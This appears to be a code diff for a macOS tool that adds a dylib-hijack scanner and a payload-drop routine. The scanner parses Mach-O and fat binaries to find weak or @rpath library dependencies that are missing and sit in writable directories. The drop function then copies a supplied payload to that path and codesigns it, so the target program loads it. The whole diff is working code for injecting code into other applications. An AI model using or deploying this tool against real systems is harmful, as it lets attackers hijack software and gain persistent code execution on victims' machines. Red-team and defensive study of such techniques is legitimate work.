@@ -10,6 +10,7 @@
 #include <libkern/OSByteOrder.h>
 #include <mach-o/fat.h>
 #include <mach-o/loader.h>
+#include <sys/syslimits.h>
 #include <spawn.h>
 #include <stdarg.h>
 #include <stdint.h>
@@ -495,4 +496,247 @@ out:
         if (run_codesign(target, errbuf, errlen) < 0) return -1;
     }
     return total_removed;
+}
+
+/* hijack scanner. */
+
+struct rpath_list { char paths[16][PATH_MAX]; int n; };
+
+/* expand `dep` (a dylib name) into a candidate filesystem path, given
+ * the binary path and rpaths. Returns 1 if expansion produced exactly one
+ * absolute path (LC_LOAD_DYLIB style or @executable_path/@loader_path), 2 if
+ * it's an @rpath/-prefixed name (caller should iterate rpaths), 0 otherwise. */
+static int resolve_dep(const char *dep, const char *binary_path,
+                       char *out, size_t outlen) {
+    char bindir[PATH_MAX];
+    snprintf(bindir, sizeof(bindir), "%s", binary_path);
+    char *slash = strrchr(bindir, '/');
+    if (slash) *slash = 0; else strcpy(bindir, ".");
+
+    if (strncmp(dep, "@rpath/", 7) == 0) return 2;
+    if (strncmp(dep, "@executable_path/", 17) == 0) {
+        snprintf(out, outlen, "%s/%s", bindir, dep + 17);
+        return 1;
+    }
+    if (strncmp(dep, "@loader_path/", 13) == 0) {
+        snprintf(out, outlen, "%s/%s", bindir, dep + 13);
+        return 1;
+    }
+    if (dep[0] == '/') {
+        snprintf(out, outlen, "%s", dep);
+        return 1;
+    }
+    return 0;
+}
+
+static int dir_writable(const char *dir) {
+    if (access(dir, W_OK) == 0) return 1;
+    /* Maybe the dir doesn't exist; check the nearest existing ancestor. */
+    char buf[PATH_MAX];
+    snprintf(buf, sizeof(buf), "%s", dir);
+    for (char *p = buf + strlen(buf); p > buf; p--) {
+        if (*p == '/') {
+            *p = 0;
+            if (access(buf, F_OK) == 0) return access(buf, W_OK) == 0;
+        }
+    }
+    return 0;
+}
+
+/* scan one slice; emits candidates via callback. */
+struct scan_ctx {
+    const char *binary_path;
+    vm_stowaway_hijack_t *out;
+    size_t max, written, total;
+};
+
+static void emit_candidate(struct scan_ctx *c, const char *path,
+                           const char *dep, int weak) {
+    /* dedup by path */
+    if (c->out) {
+        for (size_t i = 0; i < c->written; i++)
+            if (strcmp(c->out[i].path, path) == 0) return;
+    }
+    if (c->written < c->max && c->out) {
+        snprintf(c->out[c->written].path, sizeof(c->out[c->written].path), "%s", path);
+        snprintf(c->out[c->written].dep_name, sizeof(c->out[c->written].dep_name), "%s", dep);
+        c->out[c->written].weak = weak;
+        c->written++;
+    }
+    c->total++;
+}
+
+static int scan_slice(uint8_t *data, uint64_t slice_size,
+                      struct scan_ctx *c, char *err, size_t elen) {
+    if (slice_size < sizeof(struct mach_header_64)) return 0;
+    uint32_t magic;
+    memcpy(&magic, data, 4);
+    int swap;
+    if      (magic == MH_MAGIC_64) swap = 0;
+    else if (magic == MH_CIGAM_64) swap = 1;
+    else return 0;
+
+    struct mach_header_64 hdr;
+    memcpy(&hdr, data, sizeof(hdr));
+    if (swap) {
+        hdr.ncmds = OSSwapInt32(hdr.ncmds);
+        hdr.sizeofcmds = OSSwapInt32(hdr.sizeofcmds);
+    }
+
+    /* first pass: collect rpaths */
+    struct rpath_list rp = {0};
+    uint8_t *lc_cur = data + sizeof(struct mach_header_64);
+    uint8_t *lc_end = lc_cur + hdr.sizeofcmds;
+    if (lc_end > data + slice_size) { seterr(err, elen, "corrupt lc"); return -1; }
+
+    for (uint32_t i = 0; i < hdr.ncmds && lc_cur + sizeof(struct load_command) <= lc_end; i++) {
+        struct load_command lc;
+        memcpy(&lc, lc_cur, sizeof(lc));
+        uint32_t cmd = swap ? OSSwapInt32(lc.cmd) : lc.cmd;
+        uint32_t cs  = swap ? OSSwapInt32(lc.cmdsize) : lc.cmdsize;
+        if (cs < sizeof(struct load_command) || lc_cur + cs > lc_end) break;
+        if (cmd == LC_RPATH && cs > sizeof(struct rpath_command) && rp.n < 16) {
+            struct rpath_command rpc;
+            memcpy(&rpc, lc_cur, sizeof(rpc));
+            uint32_t off = swap ? OSSwapInt32(rpc.path.offset) : rpc.path.offset;
+            if (off < cs) {
+                const char *p = (const char *)(lc_cur + off);
+                snprintf(rp.paths[rp.n++], PATH_MAX, "%s", p);
+            }
+        }
+        lc_cur += cs;
+    }
+
+    /* second pass: examine each dep */
+    lc_cur = data + sizeof(struct mach_header_64);
+    for (uint32_t i = 0; i < hdr.ncmds && lc_cur + sizeof(struct load_command) <= lc_end; i++) {
+        struct load_command lc;
+        memcpy(&lc, lc_cur, sizeof(lc));
+        uint32_t cmd = swap ? OSSwapInt32(lc.cmd) : lc.cmd;
+        uint32_t cs  = swap ? OSSwapInt32(lc.cmdsize) : lc.cmdsize;
+        if (cs < sizeof(struct load_command) || lc_cur + cs > lc_end) break;
+
+        if ((cmd == LC_LOAD_DYLIB || cmd == LC_LOAD_WEAK_DYLIB) &&
+            cs > sizeof(struct dylib_command)) {
+            int weak = (cmd == LC_LOAD_WEAK_DYLIB);
+            struct dylib_command dc;
+            memcpy(&dc, lc_cur, sizeof(dc));
+            uint32_t off = swap ? OSSwapInt32(dc.dylib.name.offset) : dc.dylib.name.offset;
+            if (off >= cs) { lc_cur += cs; continue; }
+            const char *dep = (const char *)(lc_cur + off);
+            size_t maxlen = cs - off;
+            if (strnlen(dep, maxlen) == maxlen) { lc_cur += cs; continue; }
+
+            char path[PATH_MAX];
+            int k = resolve_dep(dep, c->binary_path, path, sizeof(path));
+            if (k == 1) {
+                /* candidate only if (a) absolute path doesn't exist and
+                 * (b) we can actually drop a file at that path. */
+                if (weak && access(path, F_OK) != 0) {
+                    char dirbuf[PATH_MAX];
+                    snprintf(dirbuf, sizeof(dirbuf), "%s", path);
+                    char *sl = strrchr(dirbuf, '/');
+                    if (sl) *sl = 0;
+                    if (dir_writable(dirbuf))
+                        emit_candidate(c, path, dep, 1);
+                }
+            } else if (k == 2) {
+                /* @rpath/<tail>. If no rpath resolves to an existing file,
+                 * candidate path is first writable rpath + tail. */
+                const char *tail = dep + 7;
+                int found = 0;
+                for (int r = 0; r < rp.n; r++) {
+                    char try[PATH_MAX];
+                    snprintf(try, sizeof(try), "%s/%s", rp.paths[r], tail);
+                    if (access(try, F_OK) == 0) { found = 1; break; }
+                }
+                if (!found) {
+                    for (int r = 0; r < rp.n; r++) {
+                        if (dir_writable(rp.paths[r])) {
+                            char drop[PATH_MAX];
+                            snprintf(drop, sizeof(drop), "%s/%s", rp.paths[r], tail);
+                            emit_candidate(c, drop, dep, weak);
+                            break;
+                        }
+                    }
+                }
+            }
+        }
+        lc_cur += cs;
+    }
+    return 0;
+}
+
+ssize_t vm_stowaway_scan_hijacks(const char *binary,
+                                 vm_stowaway_hijack_t *out, size_t max,
+                                 char *errbuf, size_t errlen) {
+    int fd = open(binary, O_RDONLY);
+    if (fd < 0) { seterr(errbuf, errlen, "open: %s", strerror(errno)); return -1; }
+    struct stat st;
+    if (fstat(fd, &st) < 0) { close(fd); seterr(errbuf, errlen, "stat"); return -1; }
+    uint8_t *data = mmap(NULL, st.st_size, PROT_READ, MAP_PRIVATE, fd, 0);
+    if (data == MAP_FAILED) { close(fd); seterr(errbuf, errlen, "mmap"); return -1; }
+
+    struct scan_ctx c = { .binary_path = binary, .out = out, .max = max };
+
+    uint32_t magic;
+    memcpy(&magic, data, 4);
+    int rc = 0;
+    if (magic == FAT_MAGIC || magic == FAT_CIGAM ||
+        magic == FAT_MAGIC_64 || magic == FAT_CIGAM_64) {
+        int fat_swap = (magic == FAT_CIGAM || magic == FAT_CIGAM_64);
+        int fat_64   = (magic == FAT_MAGIC_64 || magic == FAT_CIGAM_64);
+        struct fat_header fh;
+        memcpy(&fh, data, sizeof(fh));
+        uint32_t narch = fat_swap ? OSSwapInt32(fh.nfat_arch) : fh.nfat_arch;
+        size_t off = sizeof(struct fat_header);
+        for (uint32_t i = 0; i < narch; i++) {
+            uint64_t so, sz;
+            if (fat_64) {
+                struct fat_arch_64 fa; memcpy(&fa, data + off, sizeof(fa));
+                so = fat_swap ? OSSwapInt64(fa.offset) : fa.offset;
+                sz = fat_swap ? OSSwapInt64(fa.size)   : fa.size;
+                off += sizeof(fa);
+            } else {
+                struct fat_arch fa; memcpy(&fa, data + off, sizeof(fa));
+                so = fat_swap ? OSSwapInt32(fa.offset) : fa.offset;
+                sz = fat_swap ? OSSwapInt32(fa.size)   : fa.size;
+                off += sizeof(fa);
+            }
+            if ((rc = scan_slice(data + so, sz, &c, errbuf, errlen)) < 0) goto out;
+        }
+    } else {
+        rc = scan_slice(data, st.st_size, &c, errbuf, errlen);
+    }
+out:
+    munmap(data, st.st_size);
+    close(fd);
+    return rc < 0 ? -1 : (ssize_t)c.total;
+}
+
+static int mkdir_p(const char *path) {
+    char buf[PATH_MAX];
+    snprintf(buf, sizeof(buf), "%s", path);
+    for (char *p = buf + 1; *p; p++) {
+        if (*p == '/') {
+            *p = 0;
+            mkdir(buf, 0755);
+            *p = '/';
+        }
+    }
+    return mkdir(buf, 0755);
+}
+
+int vm_stowaway_hijack_drop(const char *payload_path, const char *dest,
+                            char *errbuf, size_t errlen) {
+    char dir[PATH_MAX];
+    snprintf(dir, sizeof(dir), "%s", dest);
+    char *slash = strrchr(dir, '/');
+    if (slash) {
+        *slash = 0;
+        mkdir_p(dir);
+    }
+    if (copy_file(payload_path, dest, errbuf, errlen) < 0) return -1;
+    if (run_codesign(dest, errbuf, errlen) < 0) return -1;
+    return 0;
 }
